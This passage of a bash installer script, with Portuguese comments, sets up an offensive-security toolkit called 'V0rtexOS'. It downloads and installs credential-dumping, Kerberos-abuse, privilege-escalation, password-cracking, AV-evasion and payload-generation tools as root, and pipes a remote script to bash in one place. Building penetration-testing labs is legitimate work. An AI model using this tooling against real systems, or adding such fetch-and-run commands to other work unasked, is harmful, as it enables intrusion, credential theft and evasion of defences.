        ok "Hostapd-WPE instalado"
    fi

    # ── PMKIDAttack ───────────────────────────────
    log "PMKID Attack scripts"
    mkdir -p "$SCRIPTS_DIR/wireless"
    $CURL https://raw.githubusercontent.com/ZerBea/hcxtools/master/README.md \
        -o "$SCRIPTS_DIR/wireless/hcxtools-guide.md" 2>/dev/null || true
    ok "Wireless scripts instalado"
}

# ════════════════════════════════════════════════
# SEÇÃO 6 — POST-EXPLOITATION & PRIVILEGE ESCALATION
# ════════════════════════════════════════════════
install_post_exploitation() {
    sec "POST-EXPLOITATION & PRIVILEGE ESCALATION"

    # ── LinPEAS / WinPEAS ─────────────────────────
    log "LinPEAS + WinPEAS — Privilege escalation scripts"
    mkdir -p "$TOOLS_DIR/PEASS"
    $CURL "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" \
        -o "$TOOLS_DIR/PEASS/linpeas.sh"
    $CURL "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe" \
        -o "$TOOLS_DIR/PEASS/winpeas.exe"
    chmod 755 "$TOOLS_DIR/PEASS/linpeas.sh"
    ln -sf "$TOOLS_DIR/PEASS/linpeas.sh" /usr/local/bin/linpeas
    ok "LinPEAS + WinPEAS instalado"

    # ── Linux Exploit Suggester ───────────────────
    log "Linux Exploit Suggester 2 — Kernel exploits"
    $CURL https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl \
        -o /usr/local/bin/les2.pl
    chmod 755 /usr/local/bin/les2.pl
    ok "Linux Exploit Suggester 2 instalado"

    # ── GTFOBins Helper ───────────────────────────
    log "GTFOArgs — GTFOBins lookup tool"
    if [[ ! -d "$TOOLS_DIR/gtfo" ]]; then
        $GIT https://github.com/mzfr/gtfo.git "$TOOLS_DIR/gtfo"
        pip3 install -q -e "$TOOLS_DIR/gtfo/"
        ok "GTFOBins helper instalado"
    fi

    # ── Mimikatz (Linux build) ────────────────────
    log "Mimikatz — Extração de credenciais Windows"
    mkdir -p "$TOOLS_DIR/mimikatz"
    $CURL "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" \
        -o /tmp/mimi.zip
    unzip -q /tmp/mimi.zip -d "$TOOLS_DIR/mimikatz/"
    rm /tmp/mimi.zip
    ok "Mimikatz instalado"

    # ── LaZagne — Password Recovery ───────────────
    log "LaZagne — Recuperação de senhas locais"
    if [[ ! -d "$TOOLS_DIR/LaZagne" ]]; then
        $GIT https://github.com/AlessandroZ/LaZagne.git "$TOOLS_DIR/LaZagne"
        pip3 install -q -r "$TOOLS_DIR/LaZagne/Linux/requirements.txt"
        ok "LaZagne instalado"
    fi

    # ── Kerbrute — Kerberos attacks ───────────────
    log "Kerbrute — Enumeração e brute force Kerberos"
    if ! command -v kerbrute &>/dev/null; then
        $CURL "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64" \
            -o /usr/local/bin/kerbrute
        chmod 755 /usr/local/bin/kerbrute
        ok "Kerbrute instalado"
    fi

    # ── Bloodhound + Neo4j ────────────────────────
    log "BloodHound — Mapeamento de Active Directory"
    if [[ ! -d "$TOOLS_DIR/BloodHound" ]]; then
        $GIT https://github.com/BloodHoundAD/BloodHound.git "$TOOLS_DIR/BloodHound"
        pip3 install -q bloodhound
        ok "BloodHound instalado"
    fi

    # ── SharpHound collector ──────────────────────
    $CURL "https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe" \
        -o "$TOOLS_DIR/BloodHound/SharpHound.exe" 2>/dev/null || true

    # ── Certify + Certipy — AD CS attacks ─────────
    log "Certipy — Ataques a Active Directory Certificate Services"
    pip3 install -q certipy-ad
    ok "Certipy instalado"

    # ── Rubeus ────────────────────────────────────
    log "Rubeus — Kerberos abuse tool (pre-compiled)"
    mkdir -p "$TOOLS_DIR/Rubeus"
    $CURL "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" \
        -o "$TOOLS_DIR/Rubeus/Rubeus.exe" 2>/dev/null || true
    ok "Rubeus instalado"

    # ── Nishang — PowerShell pentesting ───────────
    log "Nishang — PowerShell para offensive security"
    if [[ ! -d "$TOOLS_DIR/nishang" ]]; then
        $GIT https://github.com/samratashok/nishang.git "$TOOLS_DIR/nishang"
        ok "Nishang instalado"
    fi

    # ── BeRoot — Privilege escalation checker ─────
    log "BeRoot — Checklist de privesc Windows/Linux"
    if [[ ! -d "$TOOLS_DIR/BeRoot" ]]; then
        $GIT https://github.com/AlessandroZ/BeRoot.git "$TOOLS_DIR/BeRoot"
        ok "BeRoot instalado"
    fi

    # ── Deepce — Docker escape ────────────────────
    log "Deepce — Docker container escape"
    $CURL https://github.com/stealthcopter/deepce/raw/main/deepce.sh \
        -o /usr/local/bin/deepce
    chmod 755 /usr/local/bin/deepce
    ok "Deepce instalado"

    # ── BOF (Beacon Object Files) collection ──────
    log "BOF Collection — Beacon Object Files para Cobalt Strike/Sliver"
    if [[ ! -d "$TOOLS_DIR/BOFs" ]]; then
        $GIT https://github.com/trustedsec/CS-Situational-Awareness-BOF.git \
            "$TOOLS_DIR/BOFs/CS-SA-BOF"
        $GIT https://github.com/boku7/injectAmsiBypass.git \
            "$TOOLS_DIR/BOFs/injectAmsiBypass"
        ok "BOF Collection instalado"
    fi
}

# ════════════════════════════════════════════════
# SEÇÃO 7 — CRACKING & BRUTE FORCE
# ════════════════════════════════════════════════
install_cracking() {
    sec "CRACKING E BRUTE FORCE"

    # ── Hashcat ───────────────────────────────────
    log "Hashcat + utils"
    if ! command -v hashcat &>/dev/null; then
        pacman -S --noconfirm hashcat 2>/dev/null || true
    fi

    # ── John the Ripper Jumbo ─────────────────────
    log "John the Ripper — Jumbo edition"
    if [[ ! -d "$TOOLS_DIR/john" ]]; then
        $GIT https://github.com/openwall/john.git "$TOOLS_DIR/john"
        cd "$TOOLS_DIR/john/src" && ./configure -q && make -sj$(nproc) &>/dev/null
        ln -sf "$TOOLS_DIR/john/run/john" /usr/local/bin/john-jumbo
        cd -
        ok "John Jumbo compilado"
    fi

    # ── Hydra ─────────────────────────────────────
    log "Hydra — Network brute-forcer"
    pacman -S --noconfirm hydra 2>/dev/null || true

    # ── Medusa ────────────────────────────────────
    log "Medusa — Parallel brute force"
    pacman -S --noconfirm medusa 2>/dev/null || \
    if [[ ! -d "$TOOLS_DIR/medusa" ]]; then
        $GIT https://github.com/jmk-foofus/medusa.git "$TOOLS_DIR/medusa"
        cd "$TOOLS_DIR/medusa" && autoreconf -fi &>/dev/null && ./configure -q && make -sj$(nproc) && make install -s; cd -
        ok "Medusa compilado"
    fi

    # ── CeWL — Custom wordlist generator ──────────
    log "CeWL — Gerador de wordlist a partir de site"
    gem install -q cewl
    ok "CeWL instalado"

    # ── Mentalist — Wordlist generator ───────────
    log "Mentalist — Wordlist rule generator visual"
    if [[ ! -d "$TOOLS_DIR/mentalist" ]]; then
        $GIT https://github.com/sc0tfree/mentalist.git "$TOOLS_DIR/mentalist"
        pip3 install -q -e "$TOOLS_DIR/mentalist/"
        ok "Mentalist instalado"
    fi

    # ── Name-That-Hash ────────────────────────────
    log "Name-That-Hash — Identificador de hashes"
    pip3 install -q name-that-hash
    ok "Name-That-Hash instalado"

    # ── hcxtools ──────────────────────────────────
    log "hcxtools — Wi-Fi handshake tools para hashcat"
    pacman -S --noconfirm hcxtools hcxdumptool 2>/dev/null || true
}

# ════════════════════════════════════════════════
# SEÇÃO 8 — WORDLISTS E DICIONÁRIOS
# ════════════════════════════════════════════════
install_wordlists() {
    sec "WORDLISTS E DICIONÁRIOS"

    # ── SecLists ──────────────────────────────────
    log "SecLists — A maior coleção de wordlists para segurança"
    if [[ ! -d "$WORDLISTS_DIR/SecLists" ]]; then
        $GIT https://github.com/danielmiessler/SecLists.git "$WORDLISTS_DIR/SecLists"
        ok "SecLists instalado"
    fi

    # ── RockYou2024 ───────────────────────────────
    log "RockYou2021 — 8.4 bilhões de senhas"
    if [[ ! -f "$WORDLISTS_DIR/rockyou2021.txt.gz" ]]; then
        $CURL "https://github.com/ohmybahgosh/RockYou2021.txt/raw/main/rockyou2021.txt.gz" \
            -o "$WORDLISTS_DIR/rockyou2021.txt.gz" 2>/dev/null || \
        log "RockYou2021 — disponível em https://github.com/ohmybahgosh/RockYou2021.txt"
    fi

    # ── Probable-Wordlists ─────────────────────────
    log "Probable-Wordlists — Senhas por frequência"
    if [[ ! -d "$WORDLISTS_DIR/probable-wordlists" ]]; then
        $GIT https://github.com/berzerk0/Probable-Wordlists.git "$WORDLISTS_DIR/probable-wordlists"
        ok "Probable-Wordlists instalado"
    fi

    # ── CommonSpeak2 — Context-aware wordlists ─────
    log "CommonSpeak2 — Wordlists de subdomínios comuns"
    if [[ ! -d "$WORDLISTS_DIR/commonspeak2" ]]; then
        $GIT https://github.com/assetnote/commonspeak2-wordlists.git "$WORDLISTS_DIR/commonspeak2"
        ok "CommonSpeak2 instalado"
    fi

    # ── CrackStation wordlist ─────────────────────
    log "Symlink wordlists padrão"
    ln -sf "$WORDLISTS_DIR/SecLists" /usr/share/wordlists/seclists 2>/dev/null || true
    [[ -f /usr/share/wordlists/rockyou.txt ]] || \
        find /usr/share/wordlists -name "rockyou*" | head -1 | \
        xargs -I{} ln -sf {} /usr/share/wordlists/rockyou.txt 2>/dev/null || true
    ok "Wordlists configuradas"
}

# ════════════════════════════════════════════════
# SEÇÃO 9 — MALDEV & EVASÃO AV
# ════════════════════════════════════════════════
install_maldev() {
    sec "MALWARE DEVELOPMENT / EVASÃO AV"

    # ── msfvenom helpers ──────────────────────────
    log "Payload generation helpers"

    # ── Donut — Shellcode from .NET/PE ────────────
    log "Donut — Converte PE/.NET em shellcode independente"
    if ! command -v donut &>/dev/null; then
        $CURL "https://github.com/TheWover/donut/releases/latest/download/donut_v1.0.zip" \
            -o /tmp/donut.zip
        unzip -q /tmp/donut.zip -d /tmp/donut_dl
        find /tmp/donut_dl -name "donut_x64" -exec cp {} /usr/local/bin/donut \; 2>/dev/null || \
        find /tmp/donut_dl -name "donut" -exec cp {} /usr/local/bin/donut \;
        chmod 755 /usr/local/bin/donut
        rm -rf /tmp/donut.zip /tmp/donut_dl
        ok "Donut instalado"
    fi

    # ── GarbleGo — Go binary obfuscation ──────────
    log "Garble — Ofuscação de binários Go"
    go install -v mvdan.cc/garble@latest 2>/dev/null || \
        log "Instale Go primeiro: pacman -S go"
    ok "Garble instalado"

    # ── Shhhloader — Shellcode loader AMSI bypass ──
    log "Shhhloader — Shellcode loader com bypass AMSI"
    if [[ ! -d "$TOOLS_DIR/Shhhloader" ]]; then
        $GIT https://github.com/icyguider/Shhhloader.git "$TOOLS_DIR/Shhhloader"
        pip3 install -q -r "$TOOLS_DIR/Shhhloader/requirements.txt"
        ok "Shhhloader instalado"
    fi

    # ── OffensiveGo — Go offensive tools ──────────
    log "OffensiveGo — Coleção de tools ofensivas em Go"
    if [[ ! -d "$TOOLS_DIR/OffensiveGo" ]]; then
        $GIT https://github.com/Enelg52/OffensiveGo.git "$TOOLS_DIR/OffensiveGo"
        ok "OffensiveGo instalado"
    fi

    # ── Freeze — AV evasion PE wrapper ────────────
    log "Freeze — AV evasion via PE manipulation"
    if [[ ! -d "$TOOLS_DIR/Freeze" ]]; then
        $GIT https://github.com/optiv/Freeze.git "$TOOLS_DIR/Freeze"
        cd "$TOOLS_DIR/Freeze" && go build -ldflags="-s -w" -o /usr/local/bin/freeze . 2>/dev/null || true; cd -
        ok "Freeze instalado"
    fi

    # ── EvilClippy — Macro obfuscation ────────────
    log "EvilClippy — Ofuscação de macros Office"
    if [[ ! -d "$TOOLS_DIR/EvilClippy" ]]; then
        $GIT https://github.com/outflanknl/EvilClippy.git "$TOOLS_DIR/EvilClippy"
        ok "EvilClippy instalado (compile com mono)"
    fi

    # ── TheFatRat — Payload generator ─────────────
    log "TheFatRat — Gerador de payloads com bypass AV"
    if [[ ! -d "$TOOLS_DIR/TheFatRat" ]]; then
        $GIT https://github.com/Screetsec/TheFatRat.git "$TOOLS_DIR/TheFatRat"
        ok "TheFatRat instalado"
    fi
}

# ════════════════════════════════════════════════
# SEÇÃO 10 — FORENSE & ANÁLISE
# ════════════════════════════════════════════════
install_forensics() {
    sec "FORENSE E ANÁLISE"

    # ── Volatility 3 ──────────────────────────────
    log "Volatility 3 — Análise de dumps de memória"
    if [[ ! -d "$TOOLS_DIR/volatility3" ]]; then
        $GIT https://github.com/volatilityfoundation/volatility3.git "$TOOLS_DIR/volatility3"
        pip3 install -q -e "$TOOLS_DIR/volatility3/"
        ln -sf "$TOOLS_DIR/volatility3/vol.py" /usr/local/bin/vol3
        ok "Volatility 3 instalado"
    fi

    # ── Ghidra ────────────────────────────────────
    log "Ghidra — Engenharia reversa NSA"
    if [[ ! -d "$TOOLS_DIR/ghidra" ]]; then
        GHIDRA_VER="11.1.2"
        $CURL "https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_${GHIDRA_VER}_build/ghidra_${GHIDRA_VER}_PUBLIC_20240709.zip" \
            -o /tmp/ghidra.zip
        unzip -q /tmp/ghidra.zip -d "$TOOLS_DIR/"
        mv "$TOOLS_DIR/ghidra_${GHIDRA_VER}_PUBLIC" "$TOOLS_DIR/ghidra"
        cat > /usr/local/bin/ghidra <<'GHIDRA_WRAPPER'
#!/usr/bin/env bash
exec /opt/vortex/ghidra/ghidraRun "$@"
GHIDRA_WRAPPER
        chmod 755 /usr/local/bin/ghidra
        rm /tmp/ghidra.zip
        ok "Ghidra instalado"
    fi

    # ── JADX — Android decompiler ─────────────────
    log "JADX — Decompilador de APK Android"
    if ! command -v jadx &>/dev/null; then
        $CURL "https://github.com/skylot/jadx/releases/latest/download/jadx-1.5.0.zip" \
            -o /tmp/jadx.zip
        unzip -q /tmp/jadx.zip -d "$TOOLS_DIR/jadx"
        ln -sf "$TOOLS_DIR/jadx/bin/jadx" /usr/local/bin/jadx
        rm /tmp/jadx.zip
        ok "JADX instalado"
    fi

    # ── Cutter (Rizin GUI) ────────────────────────
    log "Cutter — GUI de análise binária"
    if ! command -v cutter &>/dev/null; then
        $CURL "https://github.com/rizinorg/cutter/releases/latest/download/Cutter-v2.3.4-Linux-x86_64.AppImage" \
            -o /usr/local/bin/cutter
        chmod 755 /usr/local/bin/cutter
        ok "Cutter instalado"
    fi

    # ── Binwalk ───────────────────────────────────
    log "Binwalk — Análise de firmware"
    pip3 install -q binwalk
    ok "Binwalk instalado"

    # ── Autopsy ───────────────────────────────────
    log "Autopsy — Forense digital GUI"
    if [[ ! -d "$TOOLS_DIR/autopsy" ]]; then
        mkdir -p "$TOOLS_DIR/autopsy"
        log "Autopsy: baixe manualmente de https://www.autopsy.com/download/"
    fi

    # ── NetworkMiner ──────────────────────────────
    log "NetworkMiner — Análise de tráfego de rede"
    if [[ ! -d "$TOOLS_DIR/NetworkMiner" ]]; then
        $CURL "https://www.netresec.com/?download=NetworkMiner" \
            -o /tmp/nm.zip 2>/dev/null || true
        ok "NetworkMiner catalogado"
    fi

    # ── Stegseek — Steganografia brute force ──────
    log "Stegseek — Cracker de steganografia (stego)"
    if ! command -v stegseek &>/dev/null; then
        $CURL "https://github.com/RickdeJager/stegseek/releases/latest/download/stegseek_linux_amd64" \
            -o /usr/local/bin/stegseek
        chmod 755 /usr/local/bin/stegseek
        ok "Stegseek instalado"
    fi
}

# ════════════════════════════════════════════════
# SEÇÃO 11 — CLOUD & CONTAINER ATTACKS
# ════════════════════════════════════════════════
install_cloud() {
    sec "CLOUD E CONTAINER ATTACKS"

    # ── Pacu — AWS exploitation ───────────────────
    log "Pacu — Framework de exploração AWS"
    if [[ ! -d "$TOOLS_DIR/pacu" ]]; then
        $GIT https://github.com/RhinoSecurityLabs/pacu.git "$TOOLS_DIR/pacu"
        pip3 install -q -r "$TOOLS_DIR/pacu/requirements.txt"
        ln -sf "$TOOLS_DIR/pacu/cli.py" /usr/local/bin/pacu
        ok "Pacu instalado"
    fi

    # ── ScoutSuite — Cloud auditing ───────────────
    log "ScoutSuite — Auditoria multi-cloud"
    pip3 install -q scoutsuite
    ok "ScoutSuite instalado"

    # ── Prowler — AWS security assessment ─────────
    log "Prowler — Assessment de segurança AWS/Azure/GCP"
    pip3 install -q prowler
    ok "Prowler instalado"

    # ── Trivy — Container vulnerability scanner ───
    log "Trivy — Scanner de vulnerabilidades em containers"
    if ! command -v trivy &>/dev/null; then
        $CURL "https://github.com/aquasecurity/trivy/releases/latest/download/trivy_linux_64bit.tar.gz" \
            | tar -xz -C /usr/local/bin/ trivy
        chmod 755 /usr/local/bin/trivy
        ok "Trivy instalado"
    fi

    # ── kubectl-who-can — RBAC analysis ───────────
    log "Kubectl plugins de segurança"
    $CURL "https://github.com/aquasecurity/kubectl-who-can/releases/latest/download/kubectl-who-can_linux_x86_64.tar.gz" \
        | tar -xz -C /usr/local/bin/ kubectl-who-can 2>/dev/null || true
    ok "Kubectl security plugins instalado"

    # ── Kubescape ─────────────────────────────────
    log "Kubescape — Kubernetes security scanner"
    $CURL -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh | bash
    ok "Kubescape instalado"
}

# ════════════════════════════════════════════════
# SEÇÃO 12 — UTILITIES E MISC
# ════════════════════════════════════════════════
install_misc() {
    sec "UTILITIES E MISC"

    # ── Katana — Web crawler ──────────────────────
    log "Katana — Next-gen web crawler"
    if ! command -v katana &>/dev/null; then
        go install github.com/projectdiscovery/katana/cmd/katana@latest 2>/dev/null || true
        ok "Katana instalado"
    fi

    # ── Anew — Append new lines ───────────────────
    log "Anew — Append unique lines (bug bounty util)"
    go install github.com/tomnomnom/anew@latest 2>/dev/null || true

    # ── Gf — Grep patterns ────────────────────────
    log "Gf — Grep wrapper para padrões de segurança"
    go install github.com/tomnomnom/gf@latest 2>/dev/null || true
    $GIT https://github.com/1ndianl33t/Gf-Patterns.git "$TOOLS_DIR/Gf-Patterns" 2>/dev/null || true

    # ── Hakrawler ─────────────────────────────────
    log "Hakrawler — Web crawler para bug bounty"
    go install github.com/hakluke/hakrawler@latest 2>/dev/null || true

    # ── Proxychains ───────────────────────────────
    log "Proxychains-ng — Proxy de ferramentas"
    pacman -S --noconfirm proxychains-ng 2>/dev/null || true

    # ── Exploitdb (searchsploit) ──────────────────
    log "ExploitDB — Base de dados local de exploits"
    if [[ ! -d "/usr/share/exploitdb" ]]; then
        $GIT https://github.com/offensive-security/exploitdb.git /usr/share/exploitdb
        ln -sf /usr/share/exploitdb/searchsploit /usr/local/bin/searchsploit
        ok "ExploitDB / searchsploit instalado"
    fi

    # ── Metabadger — AWS metadata service ─────────
    log "Metabadger — Proteção/exploração do AWS IMDSv1"
    pip3 install -q metabadger
    ok "Metabadger instalado"

    # ── Penelope — Shell handler ───────────────────
    log "Penelope — Shell handler avançado"
    $CURL https://raw.githubusercontent.com/brightio/penelope/main/penelope.py \
        -o /usr/local/bin/penelope
    chmod 755 /usr/local/bin/penelope
    ok "Penelope instalado"

    # ── Rcat — netcat replaceable ─────────────────
    log "Rcat — Netcat replacement em Rust"
    cargo install rcat 2>/dev/null || true
    ok "Rcat instalado"

    # ── Aliases globais ───────────────────────────
    cat >> /etc/profile.d/aeternus.sh <<'ALIASES'
# V0rtexOS — Tool aliases
export TOOLS=/opt/vortex
export EXPLOITS=/opt/exploits
export CVE=/opt/cve
export WORDLISTS=/opt/wordlists
alias impacket-dir='ls /opt/vortex/impacket/examples/*.py'
alias searchsploit='searchsploit --color'
alias fix-msfdb='msfdb init'
ALIASES
}

# ════════════════════════════════════════════════
# SEÇÃO 13 — PACOTES PACMAN (BlackArch + extra)
# Ferramentas não incluídas na ISO — instaladas
# via pacman após o primeiro boot.
# ════════════════════════════════════════════════
install_pacman_tools() {
    sec "PACOTES PACMAN — BLACKARCH + EXTRA"

    log "Sincronizando repositórios..."
    pacman -Sy --noconfirm 2>/dev/null || true

    local PKGS=(
        # ── Scanning / Reconhecimento ──────────────
        masscan rustscan arp-scan netdiscover nbtscan onesixtyone
        enum4linux-ng smbmap dnsx naabu subfinder amass assetfinder
        sslscan tlsx mapcidr dnsrecon fierce whois sublist3r
        shuffledns puredns altdns dnstwist

        # ── OSINT ─────────────────────────────────
        theharvester recon-ng spiderfoot sherlock holehe
        phoneinfoga photon maltego exiftool metagoofil

        # ── Web / API / Proxy ──────────────────────
        nikto whatweb httpie mitmproxy sslsplit arjun wfuzz
        dalfox xsstrike jwt-tool tplmap sstimap graphqlmap
        linkfinder gitleaks trufflehog gau waybackurls hakrawler
        gospider httpx nuclei smuggler corscanner wafw00f
        sslyze wapiti zaproxy

        # ── Fuzzing / Discovery ────────────────────
        gobuster ffuf feroxbuster dirb dirsearch cewl crunch cupp
        wordlistctl maskprocessor statsprocessor princeprocessor

        # ── Exploração / Post-exploitation ─────────
        metasploit exploitdb sqlmap commix nosqlmap sqlninja
        evil-winrm crackmapexec impacket responder kerbrute
        bloodhound coercer ldeep enum4linux smbclient

        # ── Força Bruta / Credenciais ──────────────
        hydra medusa ncrack hashcat hashcat-utils john
        ophcrack fcrackzip pdfcrack rarcrack

        # ── Wireless / RF ──────────────────────────
        aircrack-ng hcxtools hcxdumptool reaver bully pixiewps
        cowpatty asleap mdk4 kismet bettercap wifite2 wifiphisher
        airgeddon eaphammer freeradius hostapd-wpe

        # ── Bluetooth ─────────────────────────────
        bluez bluez-utils bluesnarfer bluelog ubertooth rfkill

        # ── Análise Binária / Reverse Engineering ──
        gdb gdb-common radare2 cutter r2ghidra binwalk
        ltrace strace checksec patchelf python-pwntools
        python-capstone python-frida frida ropper one_gadget
        jadx dex2jar android-tools hexedit bsdiff patchutils yara

        # ── Análise de Rede / IDS / Sniffer ────────
        wireshark-cli wireshark-qt zeek snort suricata
        tcpflow tcpreplay tcptrace p0f ettercap netsniff-ng
        driftnet dsniff arpwatch

        # ── Forense / Recuperação ──────────────────
        secure-delete wipe foremost sleuthkit autopsy volatility3
        dc3dd ddrescue guymager safecopy testdisk scalpel
        recoverjpeg perl-image-exiftool rkhunter lynis chkrootkit clamav

        # ── Crypto / Esteganografia ────────────────
        gnupg hashid steghide stegcracker zsteg outguess
        openstego snow age

        # ── Python — Segurança ─────────────────────
        python-pwntools python-frida python-ropper python-unicorn
        python-miasm python-ssdeep python-tlsh python-oletools
        python-pefile python-macholib python-yara z3

        # ── Python — Libs extras ───────────────────
        python-gobject gtk3 gdk-pixbuf2 python-sqlalchemy
        python-tabulate python-xmltodict python-toml python-pyotp
        python-qrcode python-matplotlib python-numpy python-pandas
        python-scikit-learn python-shodan python-censys python-ldap3
        python-pyautogui python-selenium python-playwright
        python-mechanize python-html5lib python-cssselect python-six
        python-charset-normalizer python-certifi python-urllib3
        python-idna python-pyzmq python-msgpack python-redis
        python-pymongo python-elasticsearch python-fastapi

        # ── Mobile / APK ───────────────────────────
        android-tools jadx dex2jar androguard

        # ── Cloud / DevOps ─────────────────────────
        aws-cli azure-cli kubectl helm terraform ansible packer

        # ── Containers / VM ────────────────────────
        docker docker-compose podman buildah skopeo
        qemu-base qemu-img libvirt virt-manager

        # ── Banco de Dados ─────────────────────────
        sqlite postgresql postgresql-libs mariadb-clients redis

        # ── Utilitários extras ─────────────────────
        github-cli git-delta bandwhich dog gping hexyl procs
        dust sd choose xh hyperfine sysbench fio stress-ng
        bmon iftop nethogs duf glances btop unrar pigz
        dmidecode lshw inxi fastfetch screenfetch tldr
        yarn jdk-openjdk maven gradle ninja lua-socket php php-cgi

        # ── Wordlists ──────────────────────────────
        seclists
    )

    log "Instalando ${#PKGS[@]} pacotes via pacman (erros ignorados)..."
    for pkg in "${PKGS[@]}"; do
        pacman -S --noconfirm --needed "$pkg" 2>/dev/null \
            && ok "$pkg instalado" \
            || warn "$pkg não encontrado — pulando"
    done

    ok "Instalação pacman concluída"
}

# ════════════════════════════════════════════════
# MENU PRINCIPAL
# ════════════════════════════════════════════════
main() {
    [[ $EUID -ne 0 ]] && { err "Execute como root: sudo bash install-tools.sh"; exit 1; }

    local category="${1:-all}"

    echo -e "\n${CYN}╔══════════════════════════════════════════════════╗"
    echo    "║  V0rtexOS — Instalador de Tools Ofensivas    ║"
    echo -e "╚══════════════════════════════════════════════════╝${RST}\n"

    case "$category" in
        pacman)   install_pacman_tools ;;
        recon)    install_recon ;;
        exploit)  install_exploit_frameworks ;;
        cve)      install_cve_exploits ;;
        web)      install_web_tools ;;
        wireless) install_wireless ;;
        post)     install_post_exploitation ;;
        crack)    install_cracking ;;
        words)    install_wordlists ;;
        maldev)   install_maldev ;;
        forensics) install_forensics ;;
        cloud)    install_cloud ;;
        misc)     install_misc ;;
        all)
            install_pacman_tools
            install_recon
            install_exploit_frameworks
            install_cve_exploits
            install_web_tools
            install_wireless
            install_post_exploitation
            install_cracking
            install_wordlists
            install_maldev
            install_forensics
            install_cloud
            install_misc
            ;;
        *)
            err "Categoria desconhecida: $category"
            echo "Categorias: all pacman recon exploit cve web wireless post crack words maldev forensics cloud misc"
            exit 1
            ;;
    esac

    echo -e "\n${GRN}╔══════════════════════════════════════════════════╗"
    echo    "║  V0rtexOS — Instalação Concluída!            ║"
    printf  "║  Tools em: %-38s║\n" "$TOOLS_DIR"
    printf  "║  CVEs em : %-38s║\n" "$CVE_DIR"
    printf  "║  Wordlists: %-37s║\n" "$WORDLISTS_DIR"
    echo -e "╚══════════════════════════════════════════════════╝${RST}\n"
}

main "$@"
